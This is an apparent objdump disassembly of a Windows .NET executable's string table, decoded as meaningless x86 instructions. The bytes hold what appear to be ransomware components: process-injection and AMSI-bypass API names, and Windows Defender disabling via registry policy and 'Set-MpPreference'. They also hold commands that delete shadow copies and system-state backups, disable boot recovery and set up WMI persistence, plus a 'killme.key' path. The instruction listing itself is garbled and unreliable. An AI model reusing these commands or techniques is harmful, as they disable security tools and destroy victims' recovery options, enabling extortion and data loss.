  409094:	00 48 74             	add    %cl,0x74(%eax)
  409097:	74 70                	je     0x409109
  409099:	4c                   	dec    %esp
  40909a:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  4090a1:	43                   	inc    %ebx
  4090a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a4:	74 65                	je     0x40910b
  4090a6:	78 74                	js     0x40911c
  4090a8:	00 47 65             	add    %al,0x65(%edi)
  4090ab:	74 43                	je     0x4090f0
  4090ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4090af:	74 65                	je     0x409116
  4090b1:	78 74                	js     0x409127
  4090b3:	00 53 74             	add    %dl,0x74(%ebx)
  4090b6:	61                   	popa
  4090b7:	72 74                	jb     0x40912d
  4090b9:	4e                   	dec    %esi
  4090ba:	65 77 00             	gs ja  0x4090bd
  4090bd:	67 65 74 5f          	addr16 gs je 0x409120
  4090c1:	4e                   	dec    %esi
  4090c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c3:	77 00                	ja     0x4090c5
  4090c5:	67 65 74 5f          	addr16 gs je 0x409128
  4090c9:	55                   	push   %ebp
  4090ca:	74 63                	je     0x40912f
  4090cc:	4e                   	dec    %esi
  4090cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ce:	77 00                	ja     0x4090d0
  4090d0:	73 65                	jae    0x409137
  4090d2:	74 5f                	je     0x409133
  4090d4:	43                   	inc    %ebx
  4090d5:	72 65                	jb     0x40913c
  4090d7:	61                   	popa
  4090d8:	74 65                	je     0x40913f
  4090da:	4e                   	dec    %esi
  4090db:	6f                   	outsl  %ds:(%esi),(%dx)
  4090dc:	57                   	push   %edi
  4090dd:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  4090e4:	68 72 6f 77 00       	push   $0x776f72
  4090e9:	56                   	push   %esi
  4090ea:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
  4090f1:	6c                   	insb   (%dx),%es:(%edi)
  4090f2:	6c                   	insb   (%dx),%es:(%edi)
  4090f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f4:	63 45 78             	arpl   %eax,0x78(%ebp)
  4090f7:	00 52 65             	add    %dl,0x65(%edx)
  4090fa:	67 65 78 00          	addr16 gs js 0x4090fe
  4090fe:	68 65 78 00 70       	push   $0x70007865
  409103:	72 65                	jb     0x40916a
  409105:	66 69 78 00 48 61    	imul   $0x6148,0x0(%eax),%di
  40910b:	73 44                	jae    0x409151
  40910d:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409111:	54                   	push   %esp
  409112:	69 6d 69 6e 67 44 65 	imul   $0x6544676e,0x69(%ebp),%ebp
  409119:	6c                   	insb   (%dx),%es:(%edi)
  40911a:	61                   	popa
  40911b:	79 00                	jns    0x40911d
  40911d:	48                   	dec    %eax
  40911e:	65 78 53             	gs js  0x409174
  409121:	74 72                	je     0x409195
  409123:	69 6e 67 54 6f 42 79 	imul   $0x79426f54,0x67(%esi),%ebp
  40912a:	74 65                	je     0x409191
  40912c:	41                   	inc    %ecx
  40912d:	72 72                	jb     0x4091a1
  40912f:	61                   	popa
  409130:	79 00                	jns    0x409132
  409132:	49                   	dec    %ecx
  409133:	6e                   	outsb  %ds:(%esi),(%dx)
  409134:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40913b:	65 
  40913c:	41                   	inc    %ecx
  40913d:	72 72                	jb     0x4091b1
  40913f:	61                   	popa
  409140:	79 00                	jns    0x409142
  409142:	67 65 74 5f          	addr16 gs je 0x4091a5
  409146:	49                   	dec    %ecx
  409147:	73 52                	jae    0x40919b
  409149:	65 61                	gs popa
  40914b:	64 79 00             	fs jns 0x40914e
  40914e:	43                   	inc    %ebx
  40914f:	72 65                	jb     0x4091b6
  409151:	61                   	popa
  409152:	74 65                	je     0x4091b9
  409154:	53                   	push   %ebx
  409155:	75 62                	jne    0x4091b9
  409157:	4b                   	dec    %ebx
  409158:	65 79 00             	gs jns 0x40915b
  40915b:	4f                   	dec    %edi
  40915c:	70 65                	jo     0x4091c3
  40915e:	6e                   	outsb  %ds:(%esi),(%dx)
  40915f:	53                   	push   %ebx
  409160:	75 62                	jne    0x4091c4
  409162:	4b                   	dec    %ebx
  409163:	65 79 00             	gs jns 0x409166
  409166:	52                   	push   %edx
  409167:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40916e:	4b 65 
  409170:	79 00                	jns    0x409172
  409172:	67 65 74 5f          	addr16 gs je 0x4091d5
  409176:	41                   	inc    %ecx
  409177:	64 64 72 65          	fs fs jb 0x4091e0
  40917b:	73 73                	jae    0x4091f0
  40917d:	46                   	inc    %esi
  40917e:	61                   	popa
  40917f:	6d                   	insl   (%dx),%es:(%edi)
  409180:	69 6c 79 00 50 69 6e 	imul   $0x676e6950,0x0(%ecx,%edi,2),%ebp
  409187:	67 
  409188:	52                   	push   %edx
  409189:	65 70 6c             	gs jo  0x4091f8
  40918c:	79 00                	jns    0x40918e
  40918e:	41                   	inc    %ecx
  40918f:	70 70                	jo     0x409201
  409191:	6c                   	insb   (%dx),%es:(%edi)
  409192:	79 00                	jns    0x409194
  409194:	57                   	push   %edi
  409195:	68 65 6e 41 6e       	push   $0x6e416e65
  40919a:	79 00                	jns    0x40919c
  40919c:	43                   	inc    %ebx
  40919d:	6f                   	outsl  %ds:(%esi),(%dx)
  40919e:	70 79                	jo     0x409219
  4091a0:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4091a4:	64 4c                	fs dec %esp
  4091a6:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  4091ad:	41                   	inc    %ecx
  4091ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4091af:	74 69                	je     0x40921a
  4091b1:	52                   	push   %edx
  4091b2:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  4091b6:	65 72 79             	gs jb  0x409232
  4091b9:	00 57 72             	add    %dl,0x72(%edi)
  4091bc:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
  4091c3:	65 
  4091c4:	73 73                	jae    0x409239
  4091c6:	4d                   	dec    %ebp
  4091c7:	65 6d                	gs insl (%dx),%es:(%edi)
  4091c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ca:	72 79                	jb     0x409245
  4091cc:	00 67 65             	add    %ah,0x65(%edi)
  4091cf:	74 5f                	je     0x409230
  4091d1:	53                   	push   %ebx
  4091d2:	79 73                	jns    0x409247
  4091d4:	74 65                	je     0x40923b
  4091d6:	6d                   	insl   (%dx),%es:(%edi)
  4091d7:	44                   	inc    %esp
  4091d8:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4091df:	79 00                	jns    0x4091e1
  4091e1:	67 65 74 5f          	addr16 gs je 0x409244
  4091e5:	52                   	push   %edx
  4091e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e8:	74 44                	je     0x40922e
  4091ea:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4091f1:	79 00                	jns    0x4091f3
  4091f3:	49                   	dec    %ecx
  4091f4:	50                   	push   %eax
  4091f5:	48                   	dec    %eax
  4091f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f7:	73 74                	jae    0x40926d
  4091f9:	45                   	inc    %ebp
  4091fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fb:	74 72                	je     0x40926f
  4091fd:	79 00                	jns    0x4091ff
  4091ff:	47                   	inc    %edi
  409200:	65 74 48             	gs je  0x40924b
  409203:	6f                   	outsl  %ds:(%esi),(%dx)
  409204:	73 74                	jae    0x40927a
  409206:	45                   	inc    %ebp
  409207:	6e                   	outsb  %ds:(%esi),(%dx)
  409208:	74 72                	je     0x40927c
  40920a:	79 00                	jns    0x40920c
  40920c:	55                   	push   %ebp
  40920d:	70 64                	jo     0x409273
  40920f:	61                   	popa
  409210:	74 65                	je     0x409277
  409212:	52                   	push   %edx
  409213:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40921a:	00 6f 
  40921c:	70 5f                	jo     0x40927d
  40921e:	45                   	inc    %ebp
  40921f:	71 75                	jno    0x409296
  409221:	61                   	popa
  409222:	6c                   	insb   (%dx),%es:(%edi)
  409223:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  40922a:	74 
  40922b:	65 6d                	gs insl (%dx),%es:(%edi)
  40922d:	2e 53                	cs push %ebx
  40922f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409233:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  40923a:	64 
  40923b:	6f                   	outsl  %ds:(%esi),(%dx)
  40923c:	77 73                	ja     0x4092b1
  40923e:	49                   	dec    %ecx
  40923f:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409242:	74 69                	je     0x4092ad
  409244:	74 79                	je     0x4092bf
  409246:	00 49 73             	add    %cl,0x73(%ecx)
  409249:	4e                   	dec    %esi
  40924a:	75 6c                	jne    0x4092b8
  40924c:	6c                   	insb   (%dx),%es:(%edi)
  40924d:	4f                   	dec    %edi
  40924e:	72 45                	jb     0x409295
  409250:	6d                   	insl   (%dx),%es:(%edi)
  409251:	70 74                	jo     0x4092c7
  409253:	79 00                	jns    0x409255
  409255:	00 00                	add    %al,(%eax)
  409257:	00 00                	add    %al,(%eax)
  409259:	59                   	pop    %ecx
  40925a:	53                   	push   %ebx
  40925b:	00 4f 00             	add    %cl,0x0(%edi)
  40925e:	46                   	inc    %esi
  40925f:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  409263:	00 41 00             	add    %al,0x0(%ecx)
  409266:	52                   	push   %edx
  409267:	00 45 00             	add    %al,0x0(%ebp)
  40926a:	5c                   	pop    %esp
  40926b:	00 50 00             	add    %dl,0x0(%eax)
  40926e:	6f                   	outsl  %ds:(%esi),(%dx)
  40926f:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409273:	00 63 00             	add    %ah,0x0(%ebx)
  409276:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40927c:	5c                   	pop    %esp
  40927d:	00 4d 00             	add    %cl,0x0(%ebp)
  409280:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409286:	6f                   	outsl  %ds:(%esi),(%dx)
  409287:	00 73 00             	add    %dh,0x0(%ebx)
  40928a:	6f                   	outsl  %ds:(%esi),(%dx)
  40928b:	00 66 00             	add    %ah,0x0(%esi)
  40928e:	74 00                	je     0x409290
  409290:	5c                   	pop    %esp
  409291:	00 57 00             	add    %dl,0x0(%edi)
  409294:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40929a:	6f                   	outsl  %ds:(%esi),(%dx)
  40929b:	00 77 00             	add    %dh,0x0(%edi)
  40929e:	73 00                	jae    0x4092a0
  4092a0:	20 00                	and    %al,(%eax)
  4092a2:	44                   	inc    %esp
  4092a3:	00 65 00             	add    %ah,0x0(%ebp)
  4092a6:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  4092aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ab:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4092af:	00 72 00             	add    %dh,0x0(%edx)
  4092b2:	00 25 44 00 69 00    	add    %ah,0x690044
  4092b8:	73 00                	jae    0x4092ba
  4092ba:	61                   	popa
  4092bb:	00 62 00             	add    %ah,0x0(%edx)
  4092be:	6c                   	insb   (%dx),%es:(%edi)
  4092bf:	00 65 00             	add    %ah,0x0(%ebp)
  4092c2:	41                   	inc    %ecx
  4092c3:	00 6e 00             	add    %ch,0x0(%esi)
  4092c6:	74 00                	je     0x4092c8
  4092c8:	69 00 53 00 70 00    	imul   $0x700053,(%eax),%eax
  4092ce:	79 00                	jns    0x4092d0
  4092d0:	77 00                	ja     0x4092d2
  4092d2:	61                   	popa
  4092d3:	00 72 00             	add    %dh,0x0(%edx)
  4092d6:	65 00 00             	add    %al,%gs:(%eax)
  4092d9:	80 83 53 00 4f 00 46 	addb   $0x46,0x4f0053(%ebx)
  4092e0:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4092e4:	00 41 00             	add    %al,0x0(%ecx)
  4092e7:	52                   	push   %edx
  4092e8:	00 45 00             	add    %al,0x0(%ebp)
  4092eb:	5c                   	pop    %esp
  4092ec:	00 50 00             	add    %dl,0x0(%eax)
  4092ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f0:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4092f4:	00 63 00             	add    %ah,0x0(%ebx)
  4092f7:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4092fd:	5c                   	pop    %esp
  4092fe:	00 4d 00             	add    %cl,0x0(%ebp)
  409301:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409307:	6f                   	outsl  %ds:(%esi),(%dx)
  409308:	00 73 00             	add    %dh,0x0(%ebx)
  40930b:	6f                   	outsl  %ds:(%esi),(%dx)
  40930c:	00 66 00             	add    %ah,0x0(%esi)
  40930f:	74 00                	je     0x409311
  409311:	5c                   	pop    %esp
  409312:	00 57 00             	add    %dl,0x0(%edi)
  409315:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40931b:	6f                   	outsl  %ds:(%esi),(%dx)
  40931c:	00 77 00             	add    %dh,0x0(%edi)
  40931f:	73 00                	jae    0x409321
  409321:	20 00                	and    %al,(%eax)
  409323:	44                   	inc    %esp
  409324:	00 65 00             	add    %ah,0x0(%ebp)
  409327:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40932b:	6e                   	outsb  %ds:(%esi),(%dx)
  40932c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409330:	00 72 00             	add    %dh,0x0(%edx)
  409333:	5c                   	pop    %esp
  409334:	00 52 00             	add    %dl,0x0(%edx)
  409337:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40933b:	6c                   	insb   (%dx),%es:(%edi)
  40933c:	00 2d 00 54 00 69    	add    %ch,0x69005400
  409342:	00 6d 00             	add    %ch,0x0(%ebp)
  409345:	65 00 20             	add    %ah,%gs:(%eax)
  409348:	00 50 00             	add    %dl,0x0(%eax)
  40934b:	72 00                	jb     0x40934d
  40934d:	6f                   	outsl  %ds:(%esi),(%dx)
  40934e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409352:	00 63 00             	add    %ah,0x0(%ebx)
  409355:	74 00                	je     0x409357
  409357:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40935d:	01 33                	add    %esi,(%ebx)
  40935f:	44                   	inc    %esp
  409360:	00 69 00             	add    %ch,0x0(%ecx)
  409363:	73 00                	jae    0x409365
  409365:	61                   	popa
  409366:	00 62 00             	add    %ah,0x0(%edx)
  409369:	6c                   	insb   (%dx),%es:(%edi)
  40936a:	00 65 00             	add    %ah,0x0(%ebp)
  40936d:	42                   	inc    %edx
  40936e:	00 65 00             	add    %ah,0x0(%ebp)
  409371:	68 00 61 00 76       	push   $0x76006100
  409376:	00 69 00             	add    %ch,0x0(%ecx)
  409379:	6f                   	outsl  %ds:(%esi),(%dx)
  40937a:	00 72 00             	add    %dh,0x0(%edx)
  40937d:	4d                   	dec    %ebp
  40937e:	00 6f 00             	add    %ch,0x0(%edi)
  409381:	6e                   	outsb  %ds:(%esi),(%dx)
  409382:	00 69 00             	add    %ch,0x0(%ecx)
  409385:	74 00                	je     0x409387
  409387:	6f                   	outsl  %ds:(%esi),(%dx)
  409388:	00 72 00             	add    %dh,0x0(%edx)
  40938b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409391:	00 33                	add    %dh,(%ebx)
  409393:	44                   	inc    %esp
  409394:	00 69 00             	add    %ch,0x0(%ecx)
  409397:	73 00                	jae    0x409399
  409399:	61                   	popa
  40939a:	00 62 00             	add    %ah,0x0(%edx)
  40939d:	6c                   	insb   (%dx),%es:(%edi)
  40939e:	00 65 00             	add    %ah,0x0(%ebp)
  4093a1:	4f                   	dec    %edi
  4093a2:	00 6e 00             	add    %ch,0x0(%esi)
  4093a5:	41                   	inc    %ecx
  4093a6:	00 63 00             	add    %ah,0x0(%ebx)
  4093a9:	63 00                	arpl   %eax,(%eax)
  4093ab:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4093af:	73 00                	jae    0x4093b1
  4093b1:	50                   	push   %eax
  4093b2:	00 72 00             	add    %dh,0x0(%edx)
  4093b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093b6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4093ba:	00 63 00             	add    %ah,0x0(%ebx)
  4093bd:	74 00                	je     0x4093bf
  4093bf:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4093c5:	00 37                	add    %dh,(%edi)
  4093c7:	44                   	inc    %esp
  4093c8:	00 69 00             	add    %ch,0x0(%ecx)
  4093cb:	73 00                	jae    0x4093cd
  4093cd:	61                   	popa
  4093ce:	00 62 00             	add    %ah,0x0(%edx)
  4093d1:	6c                   	insb   (%dx),%es:(%edi)
  4093d2:	00 65 00             	add    %ah,0x0(%ebp)
  4093d5:	53                   	push   %ebx
  4093d6:	00 63 00             	add    %ah,0x0(%ebx)
  4093d9:	61                   	popa
  4093da:	00 6e 00             	add    %ch,0x0(%esi)
  4093dd:	4f                   	dec    %edi
  4093de:	00 6e 00             	add    %ch,0x0(%esi)
  4093e1:	52                   	push   %edx
  4093e2:	00 65 00             	add    %ah,0x0(%ebp)
  4093e5:	61                   	popa
  4093e6:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4093ea:	00 69 00             	add    %ch,0x0(%ecx)
  4093ed:	6d                   	insl   (%dx),%es:(%edi)
  4093ee:	00 65 00             	add    %ah,0x0(%ebp)
  4093f1:	45                   	inc    %ebp
  4093f2:	00 6e 00             	add    %ch,0x0(%esi)
  4093f5:	61                   	popa
  4093f6:	00 62 00             	add    %ah,0x0(%edx)
  4093f9:	6c                   	insb   (%dx),%es:(%edi)
  4093fa:	00 65 00             	add    %ah,0x0(%ebp)
  4093fd:	00 15 70 00 6f 00    	add    %dl,0x6f0070
  409403:	77 00                	ja     0x409405
  409405:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409409:	73 00                	jae    0x40940b
  40940b:	68 00 65 00 6c       	push   $0x6c006500
  409410:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409414:	63 53 00             	arpl   %edx,0x0(%ebx)
  409417:	65 00 74 00 2d       	add    %dh,%gs:0x2d(%eax,%eax,1)
  40941c:	00 4d 00             	add    %cl,0x0(%ebp)
  40941f:	70 00                	jo     0x409421
  409421:	50                   	push   %eax
  409422:	00 72 00             	add    %dh,0x0(%edx)
  409425:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409429:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40942d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409431:	63 00                	arpl   %eax,(%eax)
  409433:	65 00 20             	add    %ah,%gs:(%eax)
  409436:	00 2d 00 44 00 69    	add    %ch,0x69004400
  40943c:	00 73 00             	add    %dh,0x0(%ebx)
  40943f:	61                   	popa
  409440:	00 62 00             	add    %ah,0x0(%edx)
  409443:	6c                   	insb   (%dx),%es:(%edi)
  409444:	00 65 00             	add    %ah,0x0(%ebp)
  409447:	52                   	push   %edx
  409448:	00 65 00             	add    %ah,0x0(%ebp)
  40944b:	61                   	popa
  40944c:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409450:	00 69 00             	add    %ch,0x0(%ecx)
  409453:	6d                   	insl   (%dx),%es:(%edi)
  409454:	00 65 00             	add    %ah,0x0(%ebp)
  409457:	4d                   	dec    %ebp
  409458:	00 6f 00             	add    %ch,0x0(%edi)
  40945b:	6e                   	outsb  %ds:(%esi),(%dx)
  40945c:	00 69 00             	add    %ch,0x0(%ecx)
  40945f:	74 00                	je     0x409461
  409461:	6f                   	outsl  %ds:(%esi),(%dx)
  409462:	00 72 00             	add    %dh,0x0(%edx)
  409465:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40946b:	20 00                	and    %al,(%eax)
  40946d:	24 00                	and    $0x0,%al
  40946f:	74 00                	je     0x409471
  409471:	72 00                	jb     0x409473
  409473:	75 00                	jne    0x409475
  409475:	65 00 01             	add    %al,%gs:(%ecx)
  409478:	0f 63 00             	packsswb (%eax),%mm0
  40947b:	6d                   	insl   (%dx),%es:(%edi)
  40947c:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  409480:	00 65 00             	add    %ah,0x0(%ebp)
  409483:	78 00                	js     0x409485
  409485:	65 00 00             	add    %al,%gs:(%eax)
  409488:	4d                   	dec    %ebp
  409489:	2f                   	das
  40948a:	00 63 00             	add    %ah,0x0(%ebx)
  40948d:	20 00                	and    %al,(%eax)
  40948f:	76 00                	jbe    0x409491
  409491:	73 00                	jae    0x409493
  409493:	73 00                	jae    0x409495
  409495:	61                   	popa
  409496:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40949a:	00 69 00             	add    %ch,0x0(%ecx)
  40949d:	6e                   	outsb  %ds:(%esi),(%dx)
  40949e:	00 20                	add    %ah,(%eax)
  4094a0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4094a4:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4094a8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4094ac:	00 20                	add    %ah,(%eax)
  4094ae:	00 73 00             	add    %dh,0x0(%ebx)
  4094b1:	68 00 61 00 64       	push   $0x64006100
  4094b6:	00 6f 00             	add    %ch,0x0(%edi)
  4094b9:	77 00                	ja     0x4094bb
  4094bb:	73 00                	jae    0x4094bd
  4094bd:	20 00                	and    %al,(%eax)
  4094bf:	2f                   	das
  4094c0:	00 61 00             	add    %ah,0x0(%ecx)
  4094c3:	6c                   	insb   (%dx),%es:(%edi)
  4094c4:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4094c8:	00 2f                	add    %ch,(%edi)
  4094ca:	00 71 00             	add    %dh,0x0(%ecx)
  4094cd:	75 00                	jne    0x4094cf
  4094cf:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  4094d5:	00 11                	add    %dl,(%ecx)
  4094d7:	61                   	popa
  4094d8:	00 6d 00             	add    %ch,0x0(%ebp)
  4094db:	73 00                	jae    0x4094dd
  4094dd:	69 00 2e 00 64 00    	imul   $0x64002e,(%eax),%eax
  4094e3:	6c                   	insb   (%dx),%es:(%edi)
  4094e4:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4094e8:	1d 41 00 6d 00       	sbb    $0x6d0041,%eax
  4094ed:	73 00                	jae    0x4094ef
  4094ef:	69 00 53 00 63 00    	imul   $0x630053,(%eax),%eax
  4094f5:	61                   	popa
  4094f6:	00 6e 00             	add    %ch,0x0(%esi)
  4094f9:	42                   	inc    %edx
  4094fa:	00 75 00             	add    %dh,0x0(%ebp)
  4094fd:	66 00 66 00          	data16 add %ah,0x0(%esi)
  409501:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409505:	00 67 2f             	add    %ah,0x2f(%edi)
  409508:	00 63 00             	add    %ah,0x0(%ebx)
  40950b:	20 00                	and    %al,(%eax)
  40950d:	77 00                	ja     0x40950f
  40950f:	62 00                	bound  %eax,(%eax)
  409511:	61                   	popa
  409512:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  409516:	00 69 00             	add    %ch,0x0(%ecx)
  409519:	6e                   	outsb  %ds:(%esi),(%dx)
  40951a:	00 20                	add    %ah,(%eax)
  40951c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409520:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409524:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409528:	00 20                	add    %ah,(%eax)
  40952a:	00 73 00             	add    %dh,0x0(%ebx)
  40952d:	79 00                	jns    0x40952f
  40952f:	73 00                	jae    0x409531
  409531:	74 00                	je     0x409533
  409533:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409537:	73 00                	jae    0x409539
  409539:	74 00                	je     0x40953b
  40953b:	61                   	popa
  40953c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409540:	00 62 00             	add    %ah,0x0(%edx)
  409543:	61                   	popa
  409544:	00 63 00             	add    %ah,0x0(%ebx)
  409547:	6b 00 75             	imul   $0x75,(%eax),%eax
  40954a:	00 70 00             	add    %dh,0x0(%eax)
  40954d:	20 00                	and    %al,(%eax)
  40954f:	2d 00 6b 00 65       	sub    $0x65006b00,%eax
  409554:	00 65 00             	add    %ah,0x0(%ebp)
  409557:	70 00                	jo     0x409559
  409559:	76 00                	jbe    0x40955b
  40955b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40955f:	73 00                	jae    0x409561
  409561:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409567:	73 00                	jae    0x409569
  409569:	3a 00                	cmp    (%eax),%al
  40956b:	30 00                	xor    %al,(%eax)
  40956d:	01 59 2f             	add    %ebx,0x2f(%ecx)
  409570:	00 63 00             	add    %ah,0x0(%ebx)
  409573:	20 00                	and    %al,(%eax)
  409575:	62 00                	bound  %eax,(%eax)
  409577:	63 00                	arpl   %eax,(%eax)
  409579:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40957d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409581:	74 00                	je     0x409583
  409583:	20 00                	and    %al,(%eax)
  409585:	2f                   	das
  409586:	00 73 00             	add    %dh,0x0(%ebx)
  409589:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40958e:	00 7b 00             	add    %bh,0x0(%ebx)
  409591:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409595:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409599:	75 00                	jne    0x40959b
  40959b:	6c                   	insb   (%dx),%es:(%edi)
  40959c:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  4095a0:	00 20                	add    %ah,(%eax)
  4095a2:	00 72 00             	add    %dh,0x0(%edx)
  4095a5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4095a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095aa:	00 76 00             	add    %dh,0x0(%esi)
  4095ad:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4095b1:	79 00                	jns    0x4095b3
  4095b3:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4095b7:	61                   	popa
  4095b8:	00 62 00             	add    %ah,0x0(%edx)
  4095bb:	6c                   	insb   (%dx),%es:(%edi)
  4095bc:	00 65 00             	add    %ah,0x0(%ebp)
  4095bf:	64 00 20             	add    %ah,%fs:(%eax)
  4095c2:	00 4e 00             	add    %cl,0x0(%esi)
  4095c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c6:	00 00                	add    %al,(%eax)
  4095c8:	1b 43 00             	sbb    0x0(%ebx),%eax
  4095cb:	3a 00                	cmp    (%eax),%al
  4095cd:	5c                   	pop    %esp
  4095ce:	00 6b 00             	add    %ch,0x0(%ebx)
  4095d1:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  4095d7:	6d                   	insl   (%dx),%es:(%edi)
  4095d8:	00 65 00             	add    %ah,0x0(%ebp)
  4095db:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4095df:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4095e3:	00 80 81 2f 00 63    	add    %al,0x63002f81(%eax)
  4095e9:	00 20                	add    %ah,(%eax)
  4095eb:	00 77 00             	add    %dh,0x0(%edi)
  4095ee:	6d                   	insl   (%dx),%es:(%edi)
  4095ef:	00 69 00             	add    %ch,0x0(%ecx)
  4095f2:	63 00                	arpl   %eax,(%eax)
  4095f4:	20 00                	and    %al,(%eax)
  4095f6:	2f                   	das
  4095f7:	00 6e 00             	add    %ch,0x0(%esi)
  4095fa:	61                   	popa
  4095fb:	00 6d 00             	add    %ch,0x0(%ebp)
  4095fe:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409602:	70 00                	jo     0x409604
  409604:	61                   	popa
  409605:	00 63 00             	add    %ah,0x0(%ebx)
  409608:	65 00 3a             	add    %bh,%gs:(%edx)
  40960b:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  40960f:	00 72 00             	add    %dh,0x0(%edx)
  409612:	6f                   	outsl  %ds:(%esi),(%dx)
  409613:	00 6f 00             	add    %ch,0x0(%edi)
  409616:	74 00                	je     0x409618
  409618:	5c                   	pop    %esp
  409619:	00 73 00             	add    %dh,0x0(%ebx)
  40961c:	75 00                	jne    0x40961e
  40961e:	62 00                	bound  %eax,(%eax)
  409620:	73 00                	jae    0x409622
  409622:	63 00                	arpl   %eax,(%eax)
  409624:	72 00                	jb     0x409626
  409626:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40962c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409632:	20 00                	and    %al,(%eax)
  409634:	50                   	push   %eax
  409635:	00 41 00             	add    %al,0x0(%ecx)
  409638:	54                   	push   %esp
